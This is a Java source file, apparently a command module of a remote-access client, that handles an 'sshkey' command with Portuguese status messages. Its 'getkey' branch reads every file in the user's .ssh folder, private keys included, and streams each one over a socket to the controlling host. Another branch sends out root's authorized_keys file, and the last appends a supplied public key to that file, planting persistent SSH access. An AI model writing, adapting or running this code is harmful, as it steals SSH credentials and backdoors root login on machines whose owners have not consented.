package br.com.introcdc.connect.client.commands.file.external;
/*
 * Written by IntroCDC, Bruno Coelho at 11/09/2026 - 19:42
 */

import br.com.introcdc.connect.Connect;
import br.com.introcdc.connect.client.ConnectClient;
import br.com.introcdc.connect.client.command.ClientCommand;
import br.com.introcdc.connect.client.components.ClientFileComponents;

import java.io.BufferedInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.StandardOpenOption;

public class ClientCommandSshKey extends ClientCommand {

    public ClientCommandSshKey() {
        super("sshkey");
    }

    @Override
    public void execute(String command, String input) throws Exception {
        if (input.equalsIgnoreCase("getkey")) {
            File folder = new File(System.getProperty("user.home") + "/.ssh");
            if (!folder.exists()) {
                msg("Pasta de chaves ssh não encontrada!");
                return;
            }

            File[] files = folder.listFiles();
            if (files == null || files.length == 0) {
                msg("Pasta de chaves ssh vazia!");
                return;
            }

            for (File fileToSend : files) {
                msg("Enviando arquivo " + fileToSend.getName() + "...");
                msg("receive-file");

                try (Socket fileSocket = new Socket(Connect.IP, Connect.PORT);
                     DataOutputStream dos = new DataOutputStream(fileSocket.getOutputStream());
                     BufferedInputStream bis = new BufferedInputStream(new FileInputStream(fileToSend))) {
                    dos.writeUTF("SECONDARY:" + ConnectClient.KEY + ":RECEIVE_FILE");
                    dos.writeUTF(ClientFileComponents.removeCharacters(fileToSend.getName()));
                    dos.flush();
                    byte[] buffer = new byte[4096];
                    int bytesRead;
                    while ((bytesRead = bis.read(buffer)) != -1) {
                        dos.write(buffer, 0, bytesRead);
                    }
                } catch (Exception exception) {
                    msg("Ocorreu um erro ao enviar o arquivo: (" + exception.getMessage() + ")");
                    exception(exception);
                }
            }
            return;
        }

        File file = new File("/root/.ssh/authorized_keys");
        if (!file.exists()) {
            msg("Arquivo de chaves ssh não encontrado!");
            return;
        }

        if (input.equalsIgnoreCase("list")) {
            msg("Enviando arquivo " + file.getName() + "...");
            msg("receive-file");

            try (Socket fileSocket = new Socket(Connect.IP, Connect.PORT);
                 DataOutputStream dos = new DataOutputStream(fileSocket.getOutputStream());
                 BufferedInputStream bis = new BufferedInputStream(new FileInputStream(file))) {
                dos.writeUTF("SECONDARY:" + ConnectClient.KEY + ":RECEIVE_FILE");
                dos.writeUTF(ClientFileComponents.removeCharacters(file.getName()));
                dos.flush();
                byte[] buffer = new byte[4096];
                int bytesRead;
                while ((bytesRead = bis.read(buffer)) != -1) {
                    dos.write(buffer, 0, bytesRead);
                }
            } catch (Exception exception) {
                msg("Ocorreu um erro ao enviar o arquivo: (" + exception.getMessage() + ")");
                exception(exception);
            }
            return;
        }

        if (input.isEmpty()) {
            msg("Digite a chave ssh para instalar!");
            return;
        }

        try {
            // Garante que a pasta pai (.ssh) existe
            File parentDir = file.getParentFile();
            if (parentDir != null && !parentDir.exists()) {
                parentDir.mkdirs();
            }

            // Verifica se o arquivo já existe e não está vazio para adicionar uma quebra de linha antes
            String textToWrite = input.trim();
            if (file.exists() && file.length() > 0) {
                // Lê os bytes finais ou simplesmente garante o \n
                textToWrite = "\n" + textToWrite;
            }
            // Adiciona uma quebra de linha no final também por etiqueta
            textToWrite += "\n";

            Files.write(
                    file.toPath(),
                    textToWrite.getBytes(StandardCharsets.UTF_8),
                    StandardOpenOption.CREATE,
                    StandardOpenOption.APPEND
            );

            // Opcional: ajustar as permissões 600 do arquivo e 700 da pasta .ssh aqui se já não estiverem ajustadas!
            msg("Chave ssh instalada!");
        } catch (Exception exception) {
            exception(exception);
            msg("Não foi possível instalar a chave ssh!");
        }
    }

}
